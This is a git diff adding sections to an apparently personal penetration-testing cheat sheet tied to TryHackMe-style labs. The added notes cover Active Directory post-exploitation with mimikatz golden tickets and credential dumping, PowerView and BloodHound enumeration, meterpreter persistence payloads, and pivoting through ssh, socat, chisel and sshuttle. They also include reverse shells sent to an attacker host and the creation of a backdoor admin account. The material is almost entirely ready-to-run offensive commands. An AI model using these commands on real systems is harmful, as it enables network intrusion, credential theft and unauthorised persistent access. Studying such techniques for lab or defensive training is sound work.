@@ -51,6 +51,22 @@
 - [Attack strategies](#attack-strategies)
   - [Active Directory](#active-directory)
   - [kereberos](#kereberos)
+  - [basic post-exploit](#basic-post-exploit)
+    - [powerview](#powerview)
+    - [bloodhound](#bloodhound)
+    - [mimikatz](#mimikatz)
+    - [maintaining access](#maintaining-access)
+- [Network assessment](#network-assessment)
+  - [Steps](#steps-2)
+  - [pivot:](#pivot)
+    - [ssh](#ssh)
+    - [plink.exe](#plinkexe)
+    - [socat](#socat)
+    - [Chisel](#chisel)
+    - [sshutle](#sshutle)
+    - [proxy](#proxy)
+  - [GIt enumeration](#git-enumeration)
+    - [Stabilize and Post Exploit windows](#stabilize-and-post-exploit-windows)
 
 
 # Net Sec
@@ -552,4 +568,201 @@ admin123' UNION SELECT SLEEP(5),2;--
 - Enumerate users
   - kerbrute userenum -d domain --dc domain string wordlist.txt
 - Rubel.exe (in the victim's machine) to find hashes
-- 
+- mimikatz for golden ticket
+  - lsadump::lsa /inject /name:USERNAME
+  - kerberos::golden /user:[logged_user] /domain:[name_domain] /sid: /krbtgt:[hash_des_Nutzers] /id:
+  - msic::cmd ==> access other machine
+
+## basic post-exploit
+
+### powerview
+- enumrate domains on windows
+  - powershell -ep bypass ==> allow run script
+  - . .\PowerView.ps1
+- Get-ChildItem function: ==> commands
+ - Introduction: https://medium.com/@browninfosecguy/an-introduction-to-powerview-bdfd953f2c4c
+   - $scriptFunctions = Get-ChildItem function: | Where-Object { $currentFunctions -notcontains $_ }
+   - $scriptFunctions | Format-Wide -Column 4
+   - Get-NetDomainController
+   - Get-DomainPoliciy
+   - get-netuser | select-object displayname,samaccountname  
+   - Get-UserProperties -Properties 
+   - get-netcomputer
+   - [help] get-command
+   - get-help Get-NetComputer -examples
+   - Get-NetGroupMember
+   - Get-NetGPO  / Invoke-ShareFinder = shares
+
+### bloodhound
+- graphical interface
+- In the target:
+  - Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+- in the attacker
+  - neo4j console => database
+  - bloodhound
+    - import looted files
+
+### mimikatz
+- dumping credentials   
+- mimikatz.exe
+  - privilege::debug ==> Check if we are admin
+    -lsadump::lsa /patch 
+
+### maintaining access
+- create reverse shell
+  - msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
+  - use exploit/multi/handler
+  - use exploit/windows/local/persistence
+
+# Network assessment
+- Requirements: 
+  - Number of machines
+  - services running
+  - Publici interface?
+  - git server ?
+  - public IP
+
+-  No dns if web: add to etc/hosts
+-  OS: mostly on the server than guessing from nmap
+-  get shell if possible + stabilize the shell
+-  get ssh keys
+
+-  using pre installed tools
+   -  arp -a => arp neighbour cache
+   -  /etc/hosts
+   -  /etc/resolv.conf
+   -  ifconfig - nmcli dev show / ipconfig /all
+   -  port scanning
+      -  hosts: for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
+      -  ports: for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
+
+## Steps
+- Enumerate
+- Find everything that there is outside and inside
+- find services running, find cve for these services
+- stablish stable connection (pivoting): reverse shell, proxy, ssh, port forwarding
+- get ssh key if they are available
+
+## pivot:
+-  from on machine to another
+-  tunnelling/proxying: route all traffic (a lot of traffic)
+-  port forwarding: create connection (few ports)
+-  ProxyChain
+
+### ssh
+- Port Forwarding
+  - ssh -L [myport]:target:[open_port_target] user@[public_ip] -fN
+- Proxy
+  - ssh -D PORT user@[public_ip] -fN
+- create key pair on the attacking machine
+- transfer private key to victim
+- stablish connection from victim to attacking
+  - ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+  - executing on we habe the shell
+
+### plink.exe
+- command line for putty
+- cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
+- convert key with puttygen: puttygen key -o xxx.ppk
+
+### socat
+- Reverse shell
+  - listener on the attacker
+  - relay on compromised: ./socat tcp-l:8000 tcp:Attacker-IP:443 &
+  - create reverse shell from compromised to attacker: nc localhost 8000 -e/bin/bash
+
+- Port Forwarding - Method 1
+  - open port on victim + redirect to target server = ./socat tcp-l:[port_on_victim],fork,reuseaddr tcp:[target_ip]:3306 &
+
+- Method 2 -Quieter - read more about that https://tryhackme.com/room/wreath: 
+  - Attacker, opens to ports: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
+  - victim: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+- on victim: ./socat tcp-l:8000 tcp:10.50.102.138:443 & => connect victim back to us on port 443
+- on victim: ./nc 127.0.0.1 8000 -e /bin/bash ==> listen to port 8000 
+- Port Forwarding [From_Compromised_to_TARGET]: ./socat tcp-l:[port_on_compromised],fork,reuseaddr tcp:[IP_Target]:3306 &
+
+- Encrypted:
+  - Create certificate: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+  - merge keys: cat shell.key shell.crt > shell.pem
+  - listener: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+  - connect back: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+ close all:
+  - jobs ==> find socats processes 
+  
+### Chisel
+- set up tunnel proxy / port forward
+- client / server 
+- Reverse SOCKS Proxy
+  - server: chisel server -p [port] --reverse &
+  - client (victim0): ./chisel client [attacker]:8005 R:socks &
+    - R = remote, client knows that server antecipate proxy
+- Forward SOCK Proxy
+  - victim: ./chisel server -p LISTEN_PORT --socks5
+  - attacker: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+- Port Forward
+  - attacker: ./chisel server -p LISTEN_PORT --reverse &
+  - victim to target: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+  - victim to our machine: ./chisel server -p 1337 --reverse &
+- Local Port Forward
+  - compromised: ./chisel server -p LISTEN_PORT
+  - attacker: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+
+### sshutle
+- easier to handle
+- only linzx
+- need ssh access to public interface
+- sshuttle -r username@address subnet  
+  - -N to guess the subnet
+- No password:
+  - sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
+  - -x exclude compromised server
+- Direct access to evil-winrM
+  - evil-winrm -u pacoca -p 123456 -i 10.200.101.150
+
+
+### proxy
+- proxychains
+  - open port in our system linked to target
+  - proxychains COMMAND [host] [port] / own conf file proxychains.conf
+    - comment proxy_dns ==> cause nmap to crash
+    - no Ping (-Pn) only TCP, no UDP/SYN
+  
+- FoxyProxy
+  - better for web
+
+- ssh
+  - -L ==> Port FOrwarding
+    - ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
+      - access FIRST through SECOND, 8000 is local port
+      - -f = background
+      - -N no command execution
+  
+  - -D [PORT] ==> Proxy
+    - open port on attacking
+  
+  - Reverse Connections
+    - generate ssh key
+    - put .pub in authorized: command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-x11-forwading,no-pty ssh-rsa key
+    - restart ssh
+    - transfer private key to target: 
+      - port forward: ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+      - reverse proxy: ssh -R 1337[localport] USERNAME@ATTACKING_IP -i KEYFILE -fN
+
+## GIt enumeration
+- nmap -sn ip.1-255 -oN output
+- check error message in the http server
+- explore folders
+- find exploit
+- dos2unix exploit.py OR sed -i 's/\r//' python.py
+- correct the information on the exploit
+- execute shell there
+- execute with burp or curl
+- curl -POST localhost:8000 ==> here we go to the computer we dont have access
+
+
+### Stabilize and Post Exploit windows
+- Create user + add group admin
+  - net user USERNAME PASS /add
+  - net localgroup Administrators Username /add
+
+
